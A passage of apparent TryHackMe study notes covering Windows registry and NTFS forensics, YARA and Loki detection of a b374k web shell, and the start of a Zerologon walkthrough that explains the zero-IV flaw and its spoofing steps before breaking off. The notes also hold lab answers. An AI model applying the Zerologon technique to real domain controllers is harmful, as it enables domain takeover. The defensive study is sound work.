Samples](https://github.com/sbousseaden/EVTX-ATTACK-SAMPLES)\n- [Powershell the bluee team](https://devblogs.microsoft.com/powershell/powershell-the-blue-team/)\n- [Tampering with Windows Event Tracing: Background, Offense, and Defense](https://blog.palantir.com/tampering-with-windows-event-tracing-background-offense-and-defense-4be7ac62ac63)\n\n## See Also\n- [[write-ups/thm/sysinternals]]\n- [[write-ups/thm/core-windows-processes]]\n- [[write-ups/THM]]\n","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/windows-forensics-1":{"title":"Windows Forensics 1","content":"\n- **Forensic Artifacts**: are essential pieces of information that provide evidence of human activity *(e.g during the investigation of a crime scene: fingerprints, tools used to perform the crime, etc are all considered forensic artifacts)*. Basically all the artifacts are combined to recreate the story of how the crime was committed. In the digital world, artifacts can be small footprints of activity left on the computer system\n\n## Windows Registry\n- A a collection of databases that contains the system's configuration data about the hardware, software, user's information *(e.g recently used files, programs used, devices connected)*\n- It consists of Keys and Values\n- A¬†[Registry Hive](https://docs.microsoft.com/en-us/windows/win32/sysinfo/registry-hives#:~:text=Registry Hives. A hive is a logical group,with a separate file for the user profile.)¬†is a group of Keys, subkeys, and values stored in a single file on the disk\n- more about it on the [official doc](https://docs.microsoft.com/en-US/troubleshoot/windows-server/performance/windows-registry-advanced-users)\n### Structure\n| Folder/predefined Key | Description                                                                                                                                                                                                                                                                   |\n| --------------------- | ----------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- |\n| `HKEY_CURRENT_USER`   | Contains the root of the configuration information for the user who is currently logged on. The user's folders, screen colors, and Control Panel settings are stored here. This information is associated with the user's profile. This key is sometimes abbreviated as HKCU. |\n| `HKEY_USERS`          | Contains all the actively loaded user profiles on the computer. `HKEY_CURRENT_USER` is a subkey of `HKEY_USERS`. `HKEY_USERS` is sometimes abbreviated as HKU.                                                                                                                |\n| `HKEY_LOCAL_MACHINE`  | Contains configuration information particular to the computer (for any user). This key is sometimes abbreviated as HKLM.                                                                                                                                                      |\n| `HKEY_CLASSES_ROOT`   | Is a subkey of¬†`HKEY_LOCAL_MACHINE\\Software`. The information that is stored here makes sure that the correct program opens when you open a file by using Windows Explorer. This key is sometimes abbreviated as HKCR.                                                        |\n| `HKEY_CURRENT_CONFIG` | Contains information about the hardware profile that is used by the local computer at system startup.                                                                                                                                                                         | \n\n### Accessing hives offline\nIf you only have access to a disk image, you must know where the registry hives are located on the disk. The majority of these hives are located in the¬†`C:\\Windows\\System32\\Config`¬†directory and are:\n- **DEFAULT**: `HKEY_USERS\\DEFAULT`\n- **SAM**: `HKEY_LOCAL_MACHINE\\SAM`\n- **SECURITY**: `HKEY_LOCAL_MACHINE\\Security`\n- **SOFTWARE**: `HKEY_LOCAL_MACHINE\\Software`\n- **SYSTEM**: `HKEY_LOCAL_MACHINE\\System`\n\nApart from these hives, two other hives containing user information can be found in the User profile directory *(`C:\\Users\\\u003cusername\u003e`)*:\n- `NTUSER.dat` *(mounted on `HKEY_CURRENT_USER` upon login)*\n- `USRCLASS.dat` *(mounted on `HKEY_CURRENT_USER\\Software\\CLASSES`)*\n\n\u003e **NOTE**: These are hidden files\n\nThere's also another hive called **AmCache** located in `C:\\Windows\\AppCompat\\Programs\\Amcache.hve`. Windows creates it to save information on programs that were recemtly run on the system\n\n### Transaction Logs \u0026 Backups\n¬†The transaction logs can be considered as the journal of the changelog of the registry hive. This means that thee logs can often have the latest changes in the registry that haven't made their way to the registry hives themselves.\n \n They're stored aas a `.LOG` file in the same directory as the hive itself *(e.g for the SAM hive will be located in¬†`C:\\Windows\\System32\\Config`¬†in the filename `SAM.LOG`)*\n \n Registry backups are the opposite of Transaction logs. These are the backups of the registry hives located in the¬†`C:\\Windows\\System32\\Config`¬†directory. These hives are copied to the¬†`C:\\Windows\\System32\\Config\\RegBack`¬†directory every ten days\n\n## Data Acquisition\nFor the sake of accuracy, it is recommended practice to image the system or make a copy of the required data and perform forensics on it. This is called data acquisition.\n\nWhen we go to copy the registry hives from¬†`%WINDIR%\\System32\\Config`, we cannot because it is a restricted file. For that we can use some tools:\n- [Kape](https://www.kroll.com/en/services/cyber-risk/incident-response-litigation-support/kroll-artifact-parser-extractor-kape): is a live data acquisition and analysis tool which can be used to acquire registry data\n- [Autopsy](https://www.autopsy.com/): gives you the option to acquire data from both live systems or from a disk image\n- [FTK Imager](https://www.exterro.com/ftk-imager): similar to Autopsy and allows you to extract files from a disk image or a live system by mounting the said disk image or drive in FTK Imager\n- [AccessData's Registry Viewer](https://accessdata.com/product-download/registry-viewer-2-0-0): let's you explore the regitry similar to Windows Registry Editor *(only loads one hive at a time, and it can't take the transaction logs into account)*\n- [Eric Zimmerman's Tools](https://ericzimmerman.github.io/#!index.md): handful of¬†tools¬†that are very useful for performing Digital Forensics and Incident Response\n- [RegRipper](https://github.com/keydet89/RegRipper3.0): utility that takes a registry hive as input and outputs a report that extracts data from some of the forensically important keys and values in that hive\n\n\n## System Information \u0026 Accounts\n\n- to find the OS version check the `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion`\n\t- ![[write-ups/images/Pasted image 20220621200246.png]]\n- the hives containing the machine‚Äôs configuration data used for controlling system startup are called Control Sets. Commonly there's 2:\n\t- ControlSet001: will point to the Control Set that the machine booted with *(@ `SYSTEM\\ControlSet001`)*\n\t- ControlSet002: will be the¬†last known good¬†configuration *(@ `SYSTEM\\ControlSet002`)*\n- Windows creates a volatile Control Set when the machine is live, called the CurrentControlSet¬†(`HKLM\\SYSTEM\\CurrentControlSet`). To find out which Control et is being used a the CurrentControlSet we can look @ `SYSTEM/Select/Current`. Similary the last known good config can be found @ `SYSTEM/Select/LastKnownGood`\n- find the Computer Name from: `SYSTEM\\CurrentControlSet\\Control\\ComputerName\\ComputerName`\n- it's important to establish the time zone of the computer to better understand the chronology of events. It can be found @ `SYSTEM\\CurrentControlSet\\Control\\TimeZoneInformation`\n- **Network Interfaces \u0026 Past Networks**\n\t- the following registry key will give a list of network interfaces on the machine we are investigating: `SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Interfaces`\n\t- ![[write-ups/images/Pasted image 20220621201045.png]]\n\t- each Interface is represented with a unique identifier (GUID) subkey, which contains values relating to the interface‚Äôs TCP/IP configuration. Will provide us with info like IP address, DHCP, Subnet Masks, DNS, etc\n\t- the past networks a given machine was connected to can be found in the following locations: `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Unmanaged` \u0026 `SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NetworkList\\Signatures\\Managed`\n\t- the last write time of the registry key points to the last time these networks were connected.\n- **Autoruns**\n\t- include information about programs or commands that run when a user logs on\n\t\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`\n\t\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n\n\t\t- `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce`\n\t\t- `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\policies\\Explorer\\Run`\n\t\t- `SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run`\n\t- information about services: `SYSTEM\\CurrentControlSet\\Services`\n\t\t- ![[write-ups/images/Pasted image 20220621201358.png]]\n\t\t- if `start` is set to `0x02` =\u003e service will start on boot\n- **SAM hive and user information**: SAM hive contains user account information, login information, and group information \u0026 is mainly located @ `SAM\\Domains\\Account\\Users`\n\n## Usage of files/folders\n- **Recent Files**: Windows maintains a list of recently opened files for each user. This info is stored in the `NTUSER` hive @ `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs`\n\t- ![[write-ups/images/Pasted image 20220621201742.png]]\n\t- if we're looking for a specific extenstion *(e.g `.pdf`)* we can check the following reg key: `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs\\.pdf`\n- **Office Recent Files**: Microsoft Office also maintains a list of recently opened documents @ `NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION`\n\t- version number for each Microsoft Office release is different *(e.g `NTUSER.DAT\\Software\\Microsoft\\Office\\15.0\\Word`)*\n\t- Starting from Office 365, Microsoft now ties the location to the user's¬†[live ID](https://www.microsoft.com/security/blog/2008/05/07/what-is-a-windows-live-id/): `NTUSER.DAT\\Software\\Microsoft\\Office\\VERSION\\UserMRU\\LiveID_####\\FileMRU`\n- **ShellBags**: When any user opens a folder, it opens in a specific layout, users can change this to their preferences. Layouts can be different for different folders. This info about the WIndows *shell* is stored \u0026 can identify the most recently used files/folders. Since this setting is different 4 each usser it's located in the user hives\n\t- `USRCLASS.DAT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\Bags`\n\t- `USRCLASS.DAT\\Local Settings\\Software\\Microsoft\\Windows\\Shell\\BagMRU`\n\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\Shell\\BagMRU`\n\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\Shell\\Bags`\n\t- we can use the [ShellBag Explorer from Zimmerman](https://ericzimmerman.github.io/#!index.md)\n\t- ![[write-ups/images/Pasted image 20220621204106.png]]\n- **Open/Save and LastVisited Dialog MRUs**: When we open or save a file, a dialog box appears asking us where to save or open that file from, Windows remembering that location =\u003e we can find out recently used files if we get our hands on this information\n\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\OpenSavePIDlMRU`\n\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\ComDlg32\\LastVisitedPidlMRU`\n- **Windows Explorer Address/Search Bars**: to identify a user's recent activity is by looking at the paths typed in the Windows Explorer address bar or searches performed using the following registry keys, respectively:\n\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\TypedPaths`\n\t- `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\WordWheelQuery`\n\n## Evidence of Execution\n- **UserAssist**: Windows keeps track of applications launched by the user using Windows Explorer for statistical purposes in the User Assist registry keys\n\t- contain info about the programs launched, the time of their launch, and the number of times they were executed\n\t- programs that were run using the command line can't be found in the User Assist keys\n\t- he User Assist key is present in the NTUSER hive, mapped to each user's GUID, we can find it @ `NTUSER.DAT\\Software\\Microsoft\\Windows\\Currentversion\\Explorer\\UserAssist\\{GUID}\\Count`\n\t- ![[write-ups/images/Pasted image 20220621204651.png]]\n- **ShimCache**: is a mechanism used to keep track of application compatibility with the¬†OS¬†and tracks all applications¬†launched on the machine\n\t- main purpose in Windows is to ensure backward compatibility of applications\n\t- also called Application Compatibility Cache (AppCompatCache) \u0026 found @ `SYSTEM\\CurrentControlSet\\Control\\Session Manager\\AppCompatCache`\n\t- stores file name, file size, and last modified time of the executables\n\t- use `AppCompatCache Parser` tool to output a CSV: `AppCompatCacheParser.exe --csv \u003cpath to save output\u003e -f \u003cpath to SYSTEM hive for data parsing\u003e -c \u003ccontrol set to parse\u003e`\n\t\t- ![[write-ups/images/Pasted image 20220621204814.png]]\n- **AmCache**: AmCache hive is an artifact related to ShimCache\n\t- performs a similar function to ShimCache, and stores additional data related to program executions *(e.g execution path, installation, execution and deletion times, and SHA1 hashes)*\n\t- located in the file system @: `C:\\Windows\\appcompat\\Programs\\Amcache.hve`\n\t- info about the last executed programs can be found @ `Amcache.hve\\Root\\File\\{Volume GUID}\\`\n\t- ![[write-ups/images/Pasted image 20220621205001.png]]\n- **BAM/DAM**: Background Activity Monitor *(BAM)* keeps a tab on the activity of background applications. Similar Desktop Activity Moderator *(DAM)* is a part of Microsoft Windows that optimizes the power consumption of the device\n\t- contain data about last run programs, their full paths \u0026 last execution time @ \n\t- `SYSTEM\\CurrentControlSet\\Services\\bam\\UserSettings\\{SID}`\n\t- `SYSTEM\\CurrentControlSet\\Services\\dam\\UserSettings\\{SID}`\n\t- ![[write-ups/images/Pasted image 20220621205142.png]]\n\n## External Devices\n- **Device identification**: the following locations keep track of USB keys plugged into a system\n\t- `SYSTEM\\CurrentControlSet\\Enum\\USBSTOR` \u0026 `SYSTEM\\CurrentControlSet\\Enum\\USB`\n\t- store data such as: vendor id, product id, and version of the USB device plugged in *(can be used to identify unique devices)*\n\t- ![[write-ups/images/Pasted image 20220621205416.png]]\n- **First/Last Times**: the following registry key tracks the first time the device was connected, the last time it was connected and the last time the device was removed from the system\n\t- `SYSTEM\\CurrentControlSet\\Enum\\USBSTOR\\Ven_Prod_Version\\USBSerial#\\Properties\\{83da6326-97a6-4088-9453-a19231573b29}\\####`\n\t- the `####` can be replaced with the following digits\n\t\t- ![[write-ups/images/Pasted image 20220621205520.png]]\n- **USB Device Volume Name**: device name of the connected drive can be found at the following location: `SOFTWARE\\Microsoft\\Windows Portable Devices\\Devices`\n\t- ![[write-ups/images/Pasted image 20220621205611.png]]\n\n## Hands-On Challenge\n**Scenario**: One of the Desktops in the research lab at Organization X is suspected to have been accessed by someone unauthorized. Although they generally have only one user account per Desktop, there were multiple user accounts observed on this system. It is also suspected that the system was connected to some network drive, and a USB device was connected to the system. The triage data from the system was collected and placed on the attached¬†VM. Can you help Organization X with finding answers to the below questions?\n\n- How many user created accounts are present on the system?\n\t- open the `SAM` hive @ `C:\\Users\\THM-4n6\\Desktop\\triage\\C\\Windows\\System32\\config\\SAM` w regitry explorer\n\t- HINT: accounts with RIDs starting with 10xx are user created accounts\n\t- ![[write-ups/images/Pasted image 20220621214753.png]]\n\t- so we have 3: `THM-4n6`, `thm-user`, `thm-user2`\n- What is the username of the account that has never been logged in?\n\t- by looking @ the `Last Login Time` column we see that `thm-user2` never logged in\n\t- ![[write-ups/images/Pasted image 20220621215045.png]]\n- What's the password hint for the user THM-4n6?\n\t- ![[write-ups/images/Pasted image 20220621215116.png]]\n\t- `count`\n- When was the file 'Changelog.txt' accessed?\n\t- open the `NTUSER.dat` from `C:\\Users\\THM-4n6\\Desktop\\triage\\C\\Users\\THM-4n6` \n\t- you will be alerted about a dirty hive, just load the `.LOG1 \u0026 2` files to generate a clean one\n\t- then navigate to `NTUSER.DAT\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RecentDocs`\n\t- ![[write-ups/images/Pasted image 20220621215459.png]]\n- What is the complete path from where the python 3.8.2 installer was run?\n\t- navigate to the UserAssist `NTUSER.DAT\\Software\\Microsoft\\Windows\\Currentversion\\Explorer\\UserAssist\\{GUID}\\Count` \u0026 search for `python`\n\t- ![[write-ups/images/Pasted image 20220621215906.png]]\n- When was the USB device with the friendly name 'USB' last connected?\n\t- open the `C:\\Users\\THM-4n6\\Desktop\\triage\\C\\Windows\\System32\\config\\SYSTEM` hive *(do the same with the `.LOG` files)*\n\t- navigate to `SYSTEM\\CurrentControlSet\\Enum\\USBSTOR` to see when the devices were first installed \u0026 last connected\n\t- ![[write-ups/images/Pasted image 20220621220850.png]]\n\n\n---\n\n## References\n\n## See Also\n- [[write-ups/THM]]\n- [[write-ups/thm/windows-forensics-2]]","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/windows-forensics-2":{"title":"Windows Forensics 2","content":"\n## File Allocation Table *(FAT)*\n- default file system for Microsoft since the late 70s\n- creates a table that indexes the location of bits that are allocated to different files\n- [wiki page](https://en.wikipedia.org/wiki/File_Allocation_Table)\n\n### Data Structures\n- **Clusters**: a basic storage unit of the FAT file system. Each file stored on a storage device can be considered a group of cluters containing bits of info\n- **Directory**: contains info about file identification *(e.g filename, starting cluster, length)*\n- **File Allocation Table**: a linked list of all clusters. Contains the status of the cluster and the pointer to the next cluster in the chain\n\n### FAT12, FAT16 \u0026 FAT32\n- the FAT file format divides the available disk space into clusters for more straightforward addressing *(the nr of clusters depends on the nr of bits used to address that cluster)*\n- hence there are multiple variations: \n\n| Attribute              | FAT12     | FAT16      | FAT32       |\n| ---------------------- | --------- | ---------- | ----------- |\n| Addressable bitss      | 12        | 16         | 28          |\n| Max nr of clusters     | 4096      | 65.536     | 268.435.456 |\n| Supported cluster size | 512 - 8KB | 2MB - 32KB | 4KB - 32KB  |\n| Max volume size        | 32MB      | 2GB        | 2TB         | \n\n- in the case of FAT32 there's only 28 bits that address the cluster because the rest is used 4 administrative purposes *(e.g store the end of cluster chain, unusable parts of the disk)*\n- chances of coming across FAT12 file systems are pretty rare nowadays, even if FAT16 \u0026 FAT32 are still used in some places *(e.g USB, SD cards, digital cams)*, becase the max file/volume size are limiting factors that reduce their usage\n\n### exFAT\n- as we started using \u0026 adopting higher resolution images and videos, the max file size of FAT32 became a substantial limiting factor for camera manufacturers\n- even if Microsoft moved to the [NTFS file system](NTFS file system), it was not suitable for digital media devices as they didn't need the added security features =\u003e manufactorers lobying Microsoft to create exFAT\n- exFAT: the default file system for SD cards larger than 32GB\n\t- supports a cluster size of 4KB - 32MB\n\t- max vol size of 128PB\n\t- reduces some of the overheads of FAT to make it lighter \u0026 more efficient\n\t- max of 2,796,202 files per dir\n\n## NTFS \n- The New Technology File System was introduced by microsoft in 1993 to address the limitations of the FAT fs *(recovery capabilities, security, reliability)* while introducing new features\n- **Journaling**: log of changes to the metadata in the volume\n\t- helps the system recover from a crash / data movement due to defragmentation\n\t- log stored in `$LOGFILE` within the volume's root dir\n- **Access Controls**: they define the owner of a file/dir \u0026 permissions for each user\n- **Volume Shadow Copy**: keeps track of changes made to a file, thus a user caan restore previous file versions 4 recovery or a system restore\n\t- it has been noted that ransware actors delete the shadow copies on a victim's computer to prevent them from recovering data\n- **Alternate Data Streams (ADS)**: allows files to have multiple streams of data stored in a single file\n\t- browsers use this feature to identify file downloaded from the internet *(uing the ADS Zone Transfer)*\n\t- also malware uses it to hide code\n\n### Master File Table *(MFT)*\n- similar to the File Allocation Table there's a more extensive Master File Table in NTFS \n- a structured db that tracks the objects stored in a volume =\u003e so the data is organized here\n- some critical MFT files 4 forensics:\n\t- `$MFT`: 1st record in a volume. The Volume Boot Record *(VBR)* points to the cluster where it's located. It stores info about the clusters where all the other objects are located. This file has a dir of all the files present on the volume\n\t- `$LOGFILE`: stores the transactional logging of the file system. Helps to maintain the integrity of fs in case of crash\n\t- `$UsnJrnl`: stands for the Update Sequence Number *(USN)* Journal. Present in the `$Extend` record \u0026 contains info about all the files changed in the fs \u0026 the reason for it *(also called the change journal)*\n- we can explore the MFT using `MFTECmd`, one of [Eric Zimmerman's tools](https://ericzimmerman.github.io/#!index.md)\u003c: `MFTECmd.exe -f \u003cpath-to-$MFT-file\u003e --csv \u003cpath-to-save-results-in-csv\u003e` then use the `EZviewer`\n\t- ![[write-ups/images/Pasted image 20220623041129.png]]\n\t- similarly parse the `$Boot` file, which will provide information about the boot sector\n\t- doesn't support `$LOGFILE` as of now\n\t- ![[write-ups/images/Pasted image 20220623041612.png]]\n- Parse the $MFT file placed in¬†`C:\\users\\THM-4n6\\Desktop\\triage\\C\\`¬†and analyze it. What is the Size of the file located at¬†`.\\Windows\\Security\\logs\\SceSetupLog.etl`?\n\t- ![[write-ups/images/Pasted image 20220623041952.png]]\n\t- or from cli\n\t- ![[write-ups/images/Pasted image 20220623042007.png]]\n- What is the size of the cluster for the volume from which this triage was taken?\n\t- ![[write-ups/images/Pasted image 20220623042049.png]]\n\t- ![[write-ups/images/Pasted image 20220623042218.png]]\n\n## Recovering Deleted Files\n- as we delete a file from the file sytstem, it just deletes the entries stored in the db that store the file's location on disk =\u003e the locaation is not available / unallocated\n- however that doesn't mean the contents of the file are gone, there are still on disk as long as they're not overwritten by the file system\n- similarly, there is data on the disk in different unallocated clusters, which can possibly be recovered\n- thus, we can recover this data by analyzing the bytes *(\u0026 understanding the file struct we're searching for)* with a hex editor or with specialized tools like [Autopsy](https://www.autopsy.com/)\n\n\u003e **NOTE**: if you want to override the file's contents on disk rendering it unavailable we can use tools like `shred` \n\n\n## Evidence of Execution\n- **Windows Prefetch files**: when a program runs on Windows, it stores its info for future use. This is used to load the program quickly in case of frequent use\n\t- stored in prefetch files which are located in the¬†`C:\\Windows\\Prefetch`¬†dir\n\t- contain the last run times of the application, the number of times the application was run, and any files and device handles used by the file =\u003e excellent source for forensics\n\t- can use Prefetch Parser from Zimmerman's tools to extract the data: `PECmd.exe -f \u003cpath-to-prefetch-files\u003e --csv \u003ccsv-output\u003e`\n- **Windows 10 Timeline**: stores recently used applications and files in an SQLite database called the Windows 10 Timeline\n\t- can be a source of information about the last executed programs\n\t- contains ¬†the application that was executed and the focus time of the application\n\t- found @ `C:\\Users\\\u003cusername\u003e\\AppData\\Local\\ConnectedDevicesPlatform\\{randomfolder}\\ActivitiesCache.db`\n\t- fetch thi data with `WxTCmd.exe` from Zimmerman's tools: `WxTCmd.exe -f \u003cpath-to-timeline-file\u003e --csv \u003cpath-to-save-csv\u003e`\n- **Windows Jump Lists**: Windows introduced jump lists to help users go directly to their recently used files from the taskbar\n\t- can view jumplists by right-clicking an application's icon in the taskbar, and it will show us the recently opened files in that application\n\t- stored @ `C:\\Users\\\u003cusername\u003e\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\AutomaticDestinations`\n\t- include information about the applications executed, first time of execution, and last time of execution of the application against an AppID\n\t- also can see with Zimmerman's tools: `JLECmd.exe -f \u003cpath-to-Jumplist-file\u003e --csv \u003cpath-to-save-csv\u003e`\n\n## File/Folder Knowledge\n- **Shortcut Files**: Windows creates a shortcut file for each file opened either locally or remotely\n\t- contain information about the first and last opened times of the file and the path of the opened file, along with some other data\n\t- can be found @ `C:\\Users\\\u003cusername\u003e\\AppData\\Roaming\\Microsoft\\Windows\\Recent\\` \u0026 `C:\\Users\\\u003cusername\u003e\\AppData\\Roaming\\Microsoft\\Office\\Recent\\`\n\t- `LECmd.exe -f \u003cpath-to-shortcut-files\u003e --csv \u003cpath-to-save-csv\u003e` to explore it\n\t- can sometimes provide us with information about connected USB devices *(e.g ¬†volume name, type, and serial number)*\n- **IE/Edge History**: IE/Edge browsing history is that it includes files opened in the system as well, whether those files were opened using the browser or not\n\t- can be found @ `C:\\Users\\\u003cusername\u003e\\AppData\\Local\\Microsoft\\Windows\\WebCache\\WebCacheV*.dat`\n\t- files/folders accessed appear with a¬†`file:///*`¬†prefix in the IE/Edge history\n\t- can use several tools to analyze Web cache data *(e.g [Autopsy](https://www.autopsy.com/))*\n- **External Deivces/USB**: When any new device is attached to a system, information related to the setup of that device is stored in the¬†`setupapi.dev.log` @ `C:\\Windows\\inf\\`\n\n---\n\n## References\n\n## See Also\n- [[write-ups/THM]]\n- [[write-ups/thm/windows-forensics-1]]\n","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/yara":{"title":"YARA","content":"\n\u003e _\"The pattern matching swiss knife for malware researchers (and everyone else)\"_\n\nYARA is a tool that can be used to identify files that meet certain conditions. It is mainly in use by security researchers to classify malware.\n\n- IOCs *(hashes, IP addresses, domain names, etc.)*\n- when encountered ssomething unknown, that your sec stack might not detect, using [Other tools](#Other tools) you'll be able to add custom rules basde on your threat intellifence gathers or findings from an incident resp engagement *(forensics)*\n- Rules: \n\t- fairly trivial to pick up, hard to master *(only as effective as the understanding of searching for the right patterns)*\n\t- use rule on dir: `yara myrule.yar somedir`\n\t- more on [yara rules doc](https://yara.readthedocs.io/en/stable/writingrules.html)\n\t- [anatomy of a yara rule](anatomy of a yara rule)\n\t\t- ![[write-ups/images/Pasted image 20220607144651.png]]\n## Integrating w other libs\n- [Cuckoo Sandbox](https://cuckoosandbox.org/): automated malware analysis environment - generate rules based on behavior\n- [Python's PE Module](https://pypi.org/project/pefile/): python module which allows to play around with the windows [Portable Executable *(PE)*](Portable Executable *(PE)*) structure\n\t- behaviours such as cryptography or worming can be largely identified without reverse engineering or execution of the sample\n## Other tools\n- [Loki](https://github.com/Neo23x0/Loki): open source IOC *(Indicator of Compromise)* scanner by [Florian Roth](https://github.com/Neo23x0)\n- [Thor](https://www.nextron-systems.com/thor-lite/): multi-platform¬†IOC¬†\u0026 YARA scanner \n- [Fenrir](https://github.com/Neo23x0/Fenrir): simple bash IOC scanner *(nowadays ca be ran even on Windows)*\n- [YaYa](https://github.com/EFForg/yaya): Yet Another Yara Automaton - _manage multiple YARA rule repositories_\n- [yarGen](https://github.com/Neo23x0/yarGen): yarGen is a generator for YARA rules\n- [yarAnalyzer](https://github.com/Neo23x0/yarAnalyzer): Yara Rule Analyzer and Statistics\n- [Valhalla](https://valhalla.nextron-systems.com/): web front-end for a curated db of yara rules\n\n## Write-up\n### What is Yara?\n```bash\ntouch somefile\necho \"rule examplerule { condition: true }\" \u003e my1strule\nyara my1strule.yar somefile\n```\n- `yara --update`\n- check the `yara/signature-base/` folder for examples\n- What is the name of the base-16 numbering system that Yara can detect?\n\t- hex\n- Would the text \"Enter your Name\" be a string in an application? (Yay/Nay)\n\t- Yay\n### Using LOKI and its Yara rule set\n\n- [b374k shell](https://github.com/b374k/b374k): PHP Webshell with handy features\n- **scenario**: You are the security analyst for a mid-size law firm. A co-worker discovered suspicious files on a web server within your organization. These files were discovered while performing updates to the corporate website. The files have been copied to your machine for analysis. The files are located in the¬†`suspicious-files`¬†directory. Use Loki to answer the questions below.\n\t- ![[write-ups/images/Pasted image 20220607150705.png]]\n\n#### Answers\n- Scan file 1.¬†Does Loki detect this file as suspicious/malicious or benign?\n\t- Suspicious\n- What Yara rule did it match on?\n\t- webshell_metaslsoft\n- What does Loki classify this file as?\n\t- Web Shell\n- Based on the output, what string within the Yara rule did it match on?\n\t- Str1\n- What is the name and version of this hack tool?\n\t- b374k 2.2\n- Inspect the actual Yara file that flagged file 1. Within this rule, how many strings are there to flag this file?\n\t- 1\n- Scan file 2.¬†Does Loki detect this file as suspicious/malicious or benign?\n\t- Benign\n- Inspect file 2. What is the name and version of this web shell?\n\t- b374k 3.2.3\n\n### Creating yara rules with [yarGen](https://github.com/Neo23x0/yarGen)\n- `strings \u003cfilename\u003e | wc -l` reuturns `3580` lines for `file2`. This can be a pretty daunting task to do manually\n- luckily we can use `yarGen` to generate a rule for us\n\t```bash\n\tpython3 yarGen.py --update\n\t# generate rule\n\tpython3 yarGen.py -m¬†/home/cmnatic/suspicious-files/file2 --excludegood -o /home/cmnatic/suspicious-files/file2.yar\n\t# add custom rule to loki\n\tcp file2.yar ~/tools/loki/signature-base/yara\n\tvim file2.yar \t# explore generated yara rule\n\tloki \t\t\t# run loki \n\t```\n\n#### Answers\n- From within the root of the suspicious files directory, what command would you run to test Yara and your Yara rule against file 2?\n\t- `yara file2.yar file2/1ndex.php`\n- Did Yara rule flag file 2? (Yay/Nay)\n\t- Yay\n- Copy the Yara rule you created into the Loki signatures directory.\n- Test the Yara rule with Loki, does it flag file 2? (Yay/Nay)\n\t- Yay\n- What is the name of the variable for the string that it matched on?\n\t- Zepto\n- Inspect the Yara rule, how many strings were generated?\n\t- 20\n- One of the conditions to match on the Yara rule specifies file size. The file has to be less than what amount?\n\t- 700KB\n\n### Valhalla\n- conduct searches based on a keyword, tag, ATT\u0026CK technique, sha256, or rule name\n\n#### Answers\n- Enter the SHA256 hash of file 1 into Valhalla. Is this file attributed to an APT group? (Yay/Nay)\n\t- Yay\n- Do the same for file 2.¬†What is the name of the first Yara rule to detect file 2?\n\t- Webshell_b374k_rule1\n- Examine the information for file 2 from Virus Total (VT).¬†The Yara Signature Match is from what scanner?\n\t- THOR APT Scanner\n- Enter the SHA256 hash of file 2 into Virus Total. Did every¬†AV¬†detect this as malicious? (Yay/Nay)\n\t- Nay\n- Besides .PHP, what other extension is recorded for this file?\n\t- exe\n- What JavaScript library is used by file 2?\n\t- Zepto\n- Is this Yara rule in the default Yara file Loki uses to detect these type of hack tools? (Yay/Nay)\n\t- Nay\n\n\n---\n\n## References\n- [Yara Github](https://github.com/virustotal/yara/releases)\n\n## See Also\n- [[write-ups/thm/isac]]\n- [[write-ups/THM]]","lastmodified":"2022-09-07T18:56:29.175584279Z","tags":null},"/write-ups/thm/zerologon":{"title":"Zerologon","content":"\n## NetLogon Protocol\n\n- **Overview**\n\t- is an RPC interface *(Windows domain controllers)*\n\t- used 4 user and machine authentication *(e.g logging in to servers using NTLM, update password)*\n\t- available over TCP through a dynamic port set by the *portmapper* service OR through an SMB pipe on `445`\n\t- it uses a customized cryptographic protocol to let a client *(a domain-joined computer)* and server *(the domain controller)* prove to each other that they both know a shared secret *(i.e hash of the client's account password)*\n- initial auth handshake\n\t- ![[write-ups/images/Pasted image 20220602151627.png]]\n\n## AES-CFB8 insecure use\n- The cryptographic primitive both the client and server use to generate credential values is implemented in a function called `ComputeNetlogonCredential` *(takes an 8-byte input \u0026 performs transformasion w the secret esssion key)*\n- To acomplish this it uses the [CFB8 (8-bit cypher feedback) mode](https://en.wikipedia.org/wiki/Block_cipher_mode_of_operation#CFB)\n\t- ![[write-ups/images/Pasted image 20220603141153.png]]\n- Instead of generating the Initialization Vector *(IV)* randomly, the `ComputeNetlogonCredential` function **defines it as a fixed value which consits of 16 zero bytes** =\u003e this violates the requirments for using AES-CFB8 securely\n- Ok but what could go wrong? Well: **for 1 in 256 keys, applying AESCFB8 encryption to an all-zero plaintext will result in all-zero ciphertext**\n\t- ![[write-ups/images/Pasted image 20220603141629.png]]\n\n## Exploitation\n![[write-ups/images/Pasted image 20220603143500.png]]\n1. Spoofing the client credential\n\t- after exchanging challenges with a `NetrServerReqChallenge` call\n\t- a client authenticates by doing a `NetrServerAuthenticate3` call, which has a parameter `ClientCredential` *(that is computed by applying the `ComputeNetlogonCredential` to the client challenge)*\n\t- because we have control over the client challenge there's nothing stopping us to set it to 8 zeroes =\u003e for 1 in 256 session keys, the correct `ClientCredential` will also consist of 8 zeroes\n\t- session key will be different for every authentication attempt\n\t- computer accounts are not locked after invalid login attempt =\u003e we can try a bunch of 